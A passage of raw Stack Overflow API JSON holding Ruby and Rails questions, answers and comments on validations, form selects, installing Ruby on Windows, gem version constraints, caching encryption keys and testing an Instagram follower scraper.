message: \"Give a name\"\n}\n</code></pre>\n\n<p>When I try to create an object without the name, I'm not getting any error. For example :</p>\n\n<pre><code>me = Person.new name:\"\"\nme.errors.to_hash\n=&gt; {}\n</code></pre>\n\n<p>With the same example (just not the same classes), OpenClassrooms get an error and I don't know why I don't get any error</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "ruby-on-rails-5"], "comments": [{"owner": {"reputation": 5312, "user_id": 6535997, "user_type": "registered", "accept_rate": 62, "profile_image": "https://graph.facebook.com/10156345016155058/picture?type=large", "display_name": "Mark", "link": "https://stackoverflow.com/users/6535997/mark"}, "edited": false, "score": 0, "creation_date": 1558438489, "post_id": 56237358, "comment_id": 99093413, "body": "When you say the dropdowns use the same ID, you mean their HTML element has the same ID? Or the options they show have the same ID in your database?"}, {"owner": {"reputation": 407, "user_id": 8815101, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7389332cddf90585a7946e00d7ee7a5e?s=128&d=identicon&r=PG&f=1", "display_name": "Veda", "link": "https://stackoverflow.com/users/8815101/veda"}, "reply_to_user": {"reputation": 5312, "user_id": 6535997, "user_type": "registered", "accept_rate": 62, "profile_image": "https://graph.facebook.com/10156345016155058/picture?type=large", "display_name": "Mark", "link": "https://stackoverflow.com/users/6535997/mark"}, "edited": false, "score": 0, "creation_date": 1558438556, "post_id": 56237358, "comment_id": 99093457, "body": "Its the HTML Element ( id : :discrepancy_id)"}, {"owner": {"reputation": 5312, "user_id": 6535997, "user_type": "registered", "accept_rate": 62, "profile_image": "https://graph.facebook.com/10156345016155058/picture?type=large", "display_name": "Mark", "link": "https://stackoverflow.com/users/6535997/mark"}, "edited": false, "score": 1, "creation_date": 1558438611, "post_id": 56237358, "comment_id": 99093485, "body": "It&#39;s pretty fundamental to have elements each having a unique ID.. while I know it&#39;s not what you asked I&#39;d strongly suggest changing that if it&#39;s causing you problems instead of coding around it"}, {"owner": {"reputation": 5312, "user_id": 6535997, "user_type": "registered", "accept_rate": 62, "profile_image": "https://graph.facebook.com/10156345016155058/picture?type=large", "display_name": "Mark", "link": "https://stackoverflow.com/users/6535997/mark"}, "edited": false, "score": 0, "creation_date": 1558438639, "post_id": 56237358, "comment_id": 99093506, "body": "Just add a custom ID to your second dropdown which should fix your issue"}, {"owner": {"reputation": 407, "user_id": 8815101, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7389332cddf90585a7946e00d7ee7a5e?s=128&d=identicon&r=PG&f=1", "display_name": "Veda", "link": "https://stackoverflow.com/users/8815101/veda"}, "reply_to_user": {"reputation": 5312, "user_id": 6535997, "user_type": "registered", "accept_rate": 62, "profile_image": "https://graph.facebook.com/10156345016155058/picture?type=large", "display_name": "Mark", "link": "https://stackoverflow.com/users/6535997/mark"}, "edited": false, "score": 0, "creation_date": 1558440463, "post_id": 56237358, "comment_id": 99094569, "body": "Sorry! Both refers to the same table and id is coming from database. But both refers to different id , and second one overrides the first id . But when an option is disabled, id from 1st drop down updates the database which I want to override it 2nd drop down . Is there a way to do it?"}], "owner": {"reputation": 407, "user_id": 8815101, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7389332cddf90585a7946e00d7ee7a5e?s=128&d=identicon&r=PG&f=1", "display_name": "Veda", "link": "https://stackoverflow.com/users/8815101/veda"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 53, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1558438465, "creation_date": 1558438329, "last_edit_date": 1558438465, "question_id": 56237358, "link": "https://stackoverflow.com/questions/56237358/is-there-a-way-to-override-id-for-disabled-options-in-a-select-before-submitting", "title": "Is there a way to override id for disabled options in a select before submitting the form in Rails", "body": "<p>I am trying to disable the options inside the dropdown for archived records and want to know is there a way to override the id/ send value to the form before submitting. I have 2 dropdown which uses the same id and while editing the form for already disabled records(in the 2nd dropdown), id is getting passed from the 1st dropdown since the disabled record will not be sent.How to override this id while submitting the form?</p>\n\n<pre><code>&lt;div class=\"field\"&gt;\n    &lt;%= form.label :discrepancy_id, 'Discrepancy Category' %&gt;\n    &lt;%= form.select :discrepancy_id, Discrepancy.get_first_category_details, {include_blank: \"Select the Discrepancy category.....\" , :selected =&gt; (@fault.id.nil?) ? nil : Fault.selectedCategory(@fault.discrepancy_id)},:class =&gt; 'failure-category', :required =&gt; true%&gt;\n  &lt;/div&gt;\n\n&lt;div class=\"field\" data-target=\"fault.discrepancyContainer\"&gt;\n    &lt;%= form.label :discrepancy_id, 'Discrepancy Name' %&gt;\n    &lt;%= form.select :discrepancy_id, grouped_options_for_select(Discrepancy.get_grouped_names_based_on_category, {:selected =&gt; @fault.discrepancy_id, :disabled =&gt; Discrepancy.get_archived_entries}), {include_blank: \"Select the Discrepancy Name.....\"}, :class =&gt; 'failure-mode', :required =&gt; true %&gt;\n  &lt;/div&gt;\n</code></pre>\n"}, {"tags": ["ruby", "installation"], "comments": [{"owner": {"reputation": 5312, "user_id": 6535997, "user_type": "registered", "accept_rate": 62, "profile_image": "https://graph.facebook.com/10156345016155058/picture?type=large", "display_name": "Mark", "link": "https://stackoverflow.com/users/6535997/mark"}, "edited": false, "score": 0, "creation_date": 1558440085, "post_id": 56237354, "comment_id": 99094358, "body": "You&#39;ll be better off installing a VM and running ubuntu on that... putting that usual warning to one side, try following: <a href=\"https://docs.microsoft.com/en-us/sql/connect/ruby/step-1-configure-development-environment-for-ruby-development?view=sql-server-2017#windows\" rel=\"nofollow noreferrer\">docs.microsoft.com/en-us/sql/connect/ruby/&hellip;</a>"}, {"owner": {"reputation": 8733, "user_id": 3625433, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/N7qK6.png?s=128&g=1", "display_name": "lacostenycoder", "link": "https://stackoverflow.com/users/3625433/lacostenycoder"}, "edited": false, "score": 0, "creation_date": 1558451987, "post_id": 56237354, "comment_id": 99101802, "body": "have you tried usine a ruby version manager such as RVM?  <a href=\"https://rvm.io/rvm/install\" rel=\"nofollow noreferrer\">rvm.io/rvm/install</a>"}, {"owner": {"reputation": 21, "user_id": 2422556, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ccd58759977190387e5a4e3166dcd521?s=128&d=identicon&r=PG", "display_name": "user2422556", "link": "https://stackoverflow.com/users/2422556/user2422556"}, "edited": false, "score": 0, "creation_date": 1558523620, "post_id": 56237354, "comment_id": 99127784, "body": "I tried using RVM and when typing: rvm install 2.1.2 (the version that i want to install), I received the next message error: Requirements support for mingw is not implemented yet, report a bug here =&gt; <a href=\"https://github.com/rvm/rvm/issues\" rel=\"nofollow noreferrer\">github.com/rvm/rvm/issues</a> Requirements installation failed with status: 1. Do you know how to solve this issue. Thanks."}], "owner": {"reputation": 21, "user_id": 2422556, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ccd58759977190387e5a4e3166dcd521?s=128&d=identicon&r=PG", "display_name": "user2422556", "link": "https://stackoverflow.com/users/2422556/user2422556"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 62, "favorite_count": 1, "answer_count": 0, "score": 0, "last_activity_date": 1558441899, "creation_date": 1558438320, "last_edit_date": 1558441899, "question_id": 56237354, "link": "https://stackoverflow.com/questions/56237354/did-not-succeed-to-install-ruby-version-2-1-2-on-windows", "title": "did not succeed to install ruby version 2.1.2 on Windows", "body": "<p>Could you explain me how to install ruby version 2.1.2 in the simplest way?\nI didn't succeed to do install ruby version 2.1.2\nI only succeeded to download the .zip file ruby-2.1.2.zip.\nBut, How to install this version knowing that the rubyInstaller tool does not exist for this version.</p>\n\n<p>I've read the response in this link:\n<a href=\"https://stackoverflow.com/questions/25072631/how-to-install-ruby-2-1-2-on-windows\">How to install ruby 2.1.2 on windows?</a>\nI tried the next solution:\nInstalled Visual Studio 2013 Ultimate &amp; Windows 8.1 Platform SDK\nDownloaded &amp; extracted Ruby 2.1.2 source tarball to some directory %SRC%\nOpen Visual Studio Tools / VS2013 x64 Native Tools Command Prompt\nIn %SRC% execute win32\\configure \u2013prefix \u201cC:\\Ruby\u201d\nIn %SRC% execute nmake \u2013 at this point the compilation process failed because the file \u201cprobes.h\u201d could not be found. The file is located in the \u201cwin32\u201d subfolder, and curiously simply copying it into the %SRC% folder fixed the problem and allowed the compilation process to finish.</p>\n\n<p>but i receive an the next error:</p>\n\n<pre><code>.\\rtname: conftest.exe is not linked to msvcrt\nNMAKE : fatal error U1077: '.\\rtname' : return code '0x1'\nStop.\n</code></pre>\n"}, {"tags": ["ruby", "rubygems", "version", "gemspecs"], "comments": [{"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1558435945, "post_id": 56236438, "comment_id": 99092031, "body": "What about <code>&#39;&gt;=1.9&#39;, &#39;&lt;3&#39;</code>"}, {"owner": {"reputation": 4300, "user_id": 313522, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/e6dd88ec54643689069f97f0d52398ca?s=128&d=identicon&r=PG", "display_name": "gorn", "link": "https://stackoverflow.com/users/313522/gorn"}, "reply_to_user": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1558449851, "post_id": 56236438, "comment_id": 99100388, "body": "As for the close votes - I ask for best practices, which usualy contain not only opinion, but arguments like security, &quot;least surprise&quot;, usability. This questin in also valuable just because the answer is NOT contained in any existing documentation (I am aware of)."}], "answers": [{"comments": [{"owner": {"reputation": 4300, "user_id": 313522, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/e6dd88ec54643689069f97f0d52398ca?s=128&d=identicon&r=PG", "display_name": "gorn", "link": "https://stackoverflow.com/users/313522/gorn"}, "edited": false, "score": 0, "creation_date": 1558441674, "post_id": 56237262, "comment_id": 99095292, "body": "I know the possible syntax, the question was more about if this is recommended strategy. Is it reccomended to leave dependencies as wide as possible?"}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "reply_to_user": {"reputation": 4300, "user_id": 313522, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/e6dd88ec54643689069f97f0d52398ca?s=128&d=identicon&r=PG", "display_name": "gorn", "link": "https://stackoverflow.com/users/313522/gorn"}, "edited": false, "score": 0, "creation_date": 1558442596, "post_id": 56237262, "comment_id": 99095856, "body": "I already answered that. No, it&#39;s typically better to set an upper bound on the major version at least. Otherwise, it can be painfully difficult to track down the cause of bugs when upgrading lots of dependencies in a project."}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "reply_to_user": {"reputation": 4300, "user_id": 313522, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/e6dd88ec54643689069f97f0d52398ca?s=128&d=identicon&r=PG", "display_name": "gorn", "link": "https://stackoverflow.com/users/313522/gorn"}, "edited": false, "score": 0, "creation_date": 1558442708, "post_id": 56237262, "comment_id": 99095924, "body": "For example, look at <a href=\"https://github.com/bundler/bundler/blob/abc124185b57c42fe61ee64603676d050d37bb15/bundler.gemspec#L37-L42\" rel=\"nofollow noreferrer\">the gemspec for <code>bundler</code>; the most heavily downloaded ruby gem</a>. Some dependencies are (intentionally) even more strict, but none of them lack an upper bound."}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "reply_to_user": {"reputation": 4300, "user_id": 313522, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/e6dd88ec54643689069f97f0d52398ca?s=128&d=identicon&r=PG", "display_name": "gorn", "link": "https://stackoverflow.com/users/313522/gorn"}, "edited": false, "score": 0, "creation_date": 1558442794, "post_id": 56237262, "comment_id": 99095970, "body": "There are exceptions; use your own best judgement."}, {"owner": {"reputation": 80852, "user_id": 2483313, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rIBTG.jpg?s=128&g=1", "display_name": "spickermann", "link": "https://stackoverflow.com/users/2483313/spickermann"}, "edited": false, "score": 0, "creation_date": 1558443134, "post_id": 56237262, "comment_id": 99096150, "body": "I disagree. I would argue that you should leave dependencies as wide as possible. I see no benefit in telling people not to use a gem just because you were not able to test your gem against that future version in the past. If there is no clue that a future version might break you gem then to be too strict."}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "reply_to_user": {"reputation": 80852, "user_id": 2483313, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rIBTG.jpg?s=128&g=1", "display_name": "spickermann", "link": "https://stackoverflow.com/users/2483313/spickermann"}, "edited": false, "score": 0, "creation_date": 1558446487, "post_id": 56237262, "comment_id": 99098247, "body": "@spickermann I appreciate that this is a somewhat opinionated answer (and so is arguably unsuitable for SO!), but in my defence <a href=\"https://guides.rubygems.org/patterns/#declaring-dependencies\" rel=\"nofollow noreferrer\">the rubygems website states</a>: <i>&quot;The important note to take home here is to be aware others will be using your gems, so guard yourself from potential bugs/failures in future releases by using <code>~&gt;</code> instead of <code>&gt;=</code> if at all possible.&quot;</i> -- and I think the rubygems website is the closest one can get to &quot;recommended practice&quot; guidelines."}, {"owner": {"reputation": 4300, "user_id": 313522, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/e6dd88ec54643689069f97f0d52398ca?s=128&d=identicon&r=PG", "display_name": "gorn", "link": "https://stackoverflow.com/users/313522/gorn"}, "edited": false, "score": 0, "creation_date": 1558449588, "post_id": 56237262, "comment_id": 99100217, "body": "Rake is a great example, which shows usage of  ~&gt; which is what I see on most occasions. However it also uses rake ~&gt; 12.0 which is somewhat discutable - I have been using 10.5 until recently (debian stable) and I doubt they are incompatible with at least ver 11.0. So assording to your answer they should have probably used `&quot;&gt;=10.0&quot;, &quot;&lt;13.0&quot;. Am I right?"}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "reply_to_user": {"reputation": 4300, "user_id": 313522, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/e6dd88ec54643689069f97f0d52398ca?s=128&d=identicon&r=PG", "display_name": "gorn", "link": "https://stackoverflow.com/users/313522/gorn"}, "edited": false, "score": 1, "creation_date": 1558450018, "post_id": 56237262, "comment_id": 99100529, "body": "@gorn <i>&quot;I doubt they are incompatible...&quot;</i> -- If they are not incompatible then yes, in my opinion, that would have been a more &quot;community-friendly&quot; design. But I do not know if your presumption about compatibility is true."}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "reply_to_user": {"reputation": 4300, "user_id": 313522, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/e6dd88ec54643689069f97f0d52398ca?s=128&d=identicon&r=PG", "display_name": "gorn", "link": "https://stackoverflow.com/users/313522/gorn"}, "edited": false, "score": 0, "creation_date": 1558450440, "post_id": 56237262, "comment_id": 99100829, "body": "In fact @gorn, I did a quick git blame out of interest and sure enough: <a href=\"https://github.com/bundler/bundler/commit/233de9dba18c815a00ba4a1ba31e1ccb05f0ec25\" rel=\"nofollow noreferrer\">There is a good reason why that constraint was added</a>. Rake v10/v11 is incompatible (noisy deprecation warnings) with ruby 2.7 - so they have raised the requirement in the master branch."}, {"owner": {"reputation": 4300, "user_id": 313522, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/e6dd88ec54643689069f97f0d52398ca?s=128&d=identicon&r=PG", "display_name": "gorn", "link": "https://stackoverflow.com/users/313522/gorn"}, "edited": false, "score": 0, "creation_date": 1558450524, "post_id": 56237262, "comment_id": 99100884, "body": "Well that is for broader discussion about &quot;compatibility matrix&quot;, because I try also support 1.9 rubies etc .... However, thanks for your help, I will use this. Hopefully the opinion given is also best practice ..."}], "tags": [], "owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "is_accepted": true, "score": 2, "last_activity_date": 1558442866, "last_edit_date": 1558442866, "creation_date": 1558437979, "answer_id": 56237262, "question_id": 56236438, "link": "https://stackoverflow.com/questions/56236438/what-is-reccomended-practice-for-version-restrictions-in-rubygem-add-dependency/56237262#56237262", "title": "What is reccomended practice for version restrictions in rubygem add_dependency?", "body": "<p>If you know that your gem works with rubyzip <code>1.9</code>, then there's really no need to <em>force</em> people to use <code>&gt;=2.0</code> with it.</p>\n\n<p>Sure, updating dependencies would be a good idea for your library-user to do, but it's not <em>your</em> job to be the \"update-your-software-police\"!</p>\n\n<p>Specifying that the version must be <code>&lt; 3</code> is generally advisable (although not consistently done by developers), as there's a reasonable risk that a major dependency version bump will be incompatible with this version of your code.</p>\n\n<p>So, as a compromise, you could do:</p>\n\n<pre><code>spec.add_runtime_dependency 'rubyzip', '&gt;=1.9', '&lt;3'\n</code></pre>\n\n<p>See <a href=\"https://apidock.com/ruby/Gem/Specification/add_runtime_dependency\" rel=\"nofollow noreferrer\">the documentation</a> for valid syntax examples.</p>\n"}], "owner": {"reputation": 4300, "user_id": 313522, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/e6dd88ec54643689069f97f0d52398ca?s=128&d=identicon&r=PG", "display_name": "gorn", "link": "https://stackoverflow.com/users/313522/gorn"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 32, "favorite_count": 0, "accepted_answer_id": 56237262, "answer_count": 1, "score": 0, "last_activity_date": 1558442866, "creation_date": 1558434991, "question_id": 56236438, "link": "https://stackoverflow.com/questions/56236438/what-is-reccomended-practice-for-version-restrictions-in-rubygem-add-dependency", "title": "What is reccomended practice for version restrictions in rubygem add_dependency?", "body": "<p>When authoring a gem, what would be reccomended practice for version restrictions of dependencies. For example I know that know that my gem works wih rubyzip version 2.x, but I also know that it works for 1.9 as well. Should I state </p>\n\n<pre><code>spec.add_runtime_dependency 'rubyzip', '&gt;1.8'\n</code></pre>\n\n<p>or if the rubyzip version 1.9 is long time outdated, it is more common to \"push\" change for 2.x line? Also if I use the mentioned line, that I risk incompability with future versions, but on the other hand, leave the coice to the user.</p>\n\n<p>Note: the questions is generall and dependency on rubyzip is just an example.</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "encryption"], "comments": [{"owner": {"reputation": 6510, "user_id": 2196561, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ac22ef3edb7836c3af11f5511f7942f8?s=128&d=identicon&r=PG", "display_name": "Ebbe M. Pedersen", "link": "https://stackoverflow.com/users/2196561/ebbe-m-pedersen"}, "edited": false, "score": 0, "creation_date": 1558427654, "post_id": 56233936, "comment_id": 99087290, "body": "Really ? How many users du you have ? Keys don&#39;t really take up that much space .."}, {"owner": {"reputation": 1221, "user_id": 668356, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0635a156534f7bc2e1f93947f5c68279?s=128&d=identicon&r=PG&f=1", "display_name": "jainbasil", "link": "https://stackoverflow.com/users/668356/jainbasil"}, "reply_to_user": {"reputation": 6510, "user_id": 2196561, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ac22ef3edb7836c3af11f5511f7942f8?s=128&d=identicon&r=PG", "display_name": "Ebbe M. Pedersen", "link": "https://stackoverflow.com/users/2196561/ebbe-m-pedersen"}, "edited": false, "score": 0, "creation_date": 1558429477, "post_id": 56233936, "comment_id": 99088352, "body": "We have around a million users."}, {"owner": {"reputation": 1306, "user_id": 8008340, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/15JhO.jpg?s=128&g=1", "display_name": "Konstantin Strukov", "link": "https://stackoverflow.com/users/8008340/konstantin-strukov"}, "edited": false, "score": 2, "creation_date": 1558439847, "post_id": 56233936, "comment_id": 99094224, "body": "It depends. I&#39;d suggest using memory profiling on the near-real volume of data instead of relying on forum opinions :) Probably, it also makes sense to not cache everything - chances are users&#39; activity profiles are very different, and there are (roughly speaking) 20% users who cause 80% pressure on your infrastructure. Caching just their keys will reduce performance problems with reasonable memory trade-offs..."}], "answers": [{"tags": [], "owner": {"reputation": 1221, "user_id": 668356, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0635a156534f7bc2e1f93947f5c68279?s=128&d=identicon&r=PG&f=1", "display_name": "jainbasil", "link": "https://stackoverflow.com/users/668356/jainbasil"}, "is_accepted": false, "score": 0, "last_activity_date": 1558504660, "last_edit_date": 1558504660, "creation_date": 1558503392, "answer_id": 56249950, "question_id": 56233936, "link": "https://stackoverflow.com/questions/56233936/memory-usage-concerns-on-rails-activesupportcachingkeygenerator/56249950#56249950", "title": "Memory usage concerns on Rails ActiveSupport::CachingKeyGenerator", "body": "<p><strong>Sharing a \"working\" solution</strong></p>\n\n<p>Since <code>ActiveSupport::CachingKeyGenerator</code> uses <code>Concurrent::Map</code>, I found that caching keys will result in increased memory usage proportional to the number of users (provided all the requests are somehow routed to same node). </p>\n\n<p>For solving this, I wrote a similar <code>CachingKeyGenerator</code> that wraps <code>ActiveSupport::KeyGenerator</code> and <code>ActiveSupport::Cache::MemoryStore</code>. </p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>class CachingKeyGenerator\n  BASE = Rails.application.secrets.secret_key_base\n  LENGTH = ActiveSupport::MessageEncryptor.key_len\n  KEY_EXPIRY = 1.day\n\n  def initialize\n    @key_generator = ActiveSupport::KeyGenerator.new(Rails.application.secrets.secret_key_base)\n    @keys_cache = ActiveSupport::Cache::MemoryStore.new(expires_in: KEY_EXPIRY)\n  end\n\n  def generate_key(salt)\n    key = @keys_cache.fetch(salt)\n    if key.nil?\n      key = @key_generator.generate_key(salt, LENGTH)\n      @keys_cache.write(salt, key)\n    end\n    key\n  end\nend\n</code></pre>\n\n<p>As per the Rails documentation, <code>ActiveSupport::Cache::MemoryStore</code> is thread-safe and implements an LRU based cleanup mechanism [1]. This should make the cache's memory usage deterministic - to a size bound set for the memory store (default - 32Mb, can be defined during initialization).</p>\n\n<p><em>P.S: Yet to deploy this on production, will update here if I face any unexpected issues.</em></p>\n\n<p>[1] <a href=\"http://api.rubyonrails.org/classes/ActiveSupport/Cache/MemoryStore.html\" rel=\"nofollow noreferrer\">http://api.rubyonrails.org/classes/ActiveSupport/Cache/MemoryStore.html</a></p>\n"}], "owner": {"reputation": 1221, "user_id": 668356, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0635a156534f7bc2e1f93947f5c68279?s=128&d=identicon&r=PG&f=1", "display_name": "jainbasil", "link": "https://stackoverflow.com/users/668356/jainbasil"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 298, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1558504660, "creation_date": 1558426393, "last_edit_date": 1558427029, "question_id": 56233936, "link": "https://stackoverflow.com/questions/56233936/memory-usage-concerns-on-rails-activesupportcachingkeygenerator", "title": "Memory usage concerns on Rails ActiveSupport::CachingKeyGenerator", "body": "<p>To encrypt and store user information in database, my Rails application uses <code>salt</code> (per User) to generate <code>key</code> using <code>ActiveSupport::KeyGenerator</code>. However, the default iterations performed by <code>generate_key</code> method is <code>2**16</code> [1]. Performing key generation using the user's <code>salt</code> on every read (for decryption) and write (for encryption) is slowing down my application.</p>\n\n<p>I found that <code>ActiveSupport::CachingKeyGenerator</code> can be used to cache the key if <code>salt</code> and <code>length</code> used for key generation are remains same [2]. Internally, it uses <code>Concurrent::Map</code> [3] for caching the keys. Using <code>ActiveSupport::CachingKeyGenerator</code> has increased performance of my application because it doesn't generate the key always.</p>\n\n<p><strong>Will this increase memory usage of my application to a level where it can bring the app down?</strong></p>\n\n<p><em>References:</em></p>\n\n<ol>\n<li><p><a href=\"https://github.com/rails/rails/blob/b9ca94caea2ca6a6cc09abaffaad67b447134079/activesupport/lib/active_support/key_generator.rb#L16\" rel=\"nofollow noreferrer\">https://github.com/rails/rails/blob/b9ca94caea2ca6a6cc09abaffaad67b447134079/activesupport/lib/active_support/key_generator.rb#L16</a></p></li>\n<li><p><a href=\"https://api.rubyonrails.org/classes/ActiveSupport/CachingKeyGenerator.html\" rel=\"nofollow noreferrer\">https://api.rubyonrails.org/classes/ActiveSupport/CachingKeyGenerator.html</a></p></li>\n<li><p><a href=\"https://github.com/rails/rails/blob/b9ca94caea2ca6a6cc09abaffaad67b447134079/activesupport/lib/active_support/key_generator.rb#L33\" rel=\"nofollow noreferrer\">https://github.com/rails/rails/blob/b9ca94caea2ca6a6cc09abaffaad67b447134079/activesupport/lib/active_support/key_generator.rb#L33</a></p></li>\n</ol>\n"}, {"tags": ["ruby-on-rails", "ruby"], "answers": [{"tags": [], "owner": {"reputation": 1275, "user_id": 2903313, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ce1623b00b100930ac65e69a8069cd28?s=128&d=identicon&r=PG", "display_name": "Roc Khalil", "link": "https://stackoverflow.com/users/2903313/roc-khalil"}, "is_accepted": true, "score": 3, "last_activity_date": 1558426218, "creation_date": 1558426218, "answer_id": 56233901, "question_id": 56233520, "link": "https://stackoverflow.com/questions/56233520/unit-test-for-scraping-instagram-followers/56233901#56233901", "title": "Unit test for scraping instagram followers", "body": "<p><code>match[:count].to_f</code> of <code>1,300</code> return <code>1</code>. </p>\n\n<p>I would suggest you change it to <code>match[:count].gsub(',', '').to_f</code> where you replace the <code>,</code> with nothing then perform a <code>.to_f</code></p>\n\n<pre><code>def instagram_scraped_followers_count(instagram_username)\n  url = \"https://www.instagram.com/#{ CGI::escape(instagram_username) }/\"\n  body = HTTParty.get(url)\n\n  match = body.match(/(?&lt;=content\\=\")(?&lt;count&gt;\\d+[,.]?\\d*)(?&lt;unit&gt;[km])?(?=\\sFollowers)/) if body\n  match['count'].gsub(',', '').to_f * instagram_multiplier(match['unit']) if match\nend\n\ndef instagram_multiplier(unit)\n  case unit\n  when 'm' then 1_000_000\n  when 'k' then 1_000\n  else 1\n  end\nend\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 2639, "user_id": 3092183, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/496bb477dfd000e3a732225cf065202a?s=128&d=identicon&r=PG", "display_name": "Richard-Degenne", "link": "https://stackoverflow.com/users/3092183/richard-degenne"}, "is_accepted": false, "score": 2, "last_activity_date": 1558428248, "creation_date": 1558428248, "answer_id": 56234438, "question_id": 56233520, "link": "https://stackoverflow.com/questions/56233520/unit-test-for-scraping-instagram-followers/56234438#56234438", "title": "Unit test for scraping instagram followers", "body": "<p>If you want to mock HTTP calls, I suggest you use <a href=\"https://github.com/bblimke/webmock\" rel=\"nofollow noreferrer\">webmock</a>, a gem tailored for that use case.</p>\n\n<p>It will let you write something along the lines of:</p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>let(:instagram_username) { 'whatever' }\nlet(:body) { '...' }\n\nbefore do\n  stub_request(:get, 'https://www.instragram.com/whatever/').and_return(body: body)\nend\n</code></pre>\n\n<hr>\n\n<h1>Further considerations</h1>\n\n<p>Instagram provides developers with <a href=\"https://www.instagram.com/developer/\" rel=\"nofollow noreferrer\">an API</a>. You might want to use this instead of <a href=\"https://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags\">parsing a HTML document with a regex</a>.</p>\n\n<p>There might even be a gem that does the Ruby heavy-lifting for you.</p>\n"}], "owner": {"reputation": 314, "user_id": 2916803, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/cf4d2b53d362ecf102683795a5c2d07b?s=128&d=identicon&r=PG&f=1", "display_name": "drifterOcean19", "link": "https://stackoverflow.com/users/2916803/drifterocean19"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 168, "favorite_count": 0, "accepted_answer_id": 56233901, "answer_count": 2, "score": 1, "last_activity_date": 1558430210, "creation_date": 1558424691, "last_edit_date": 1558430210, "question_id": 56233520, "link": "https://stackoverflow.com/questions/56233520/unit-test-for-scraping-instagram-followers", "title": "Unit test for 